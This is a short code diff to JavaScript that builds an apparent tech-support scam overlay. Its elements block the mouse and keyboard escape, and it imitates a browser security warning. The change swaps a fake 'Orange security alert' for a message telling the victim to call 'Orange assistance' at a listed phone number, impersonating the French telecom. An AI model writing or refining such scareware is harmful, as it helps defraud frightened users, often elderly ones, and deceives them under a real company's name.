@@ -15,8 +15,9 @@
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
     '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
     '<div class="browser-chrome-modal">' +
-    '<p class="browser-chrome-alert">Alerte de sécurité Orange</p>' +
-    '<p class="browser-chrome-warning">Navigation bloquée — ne quittez pas cette page</p>' +
+    '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
+    '<p class="browser-chrome-warning">Appellez l\'assistance Orange</p>' +
+    '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
     '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
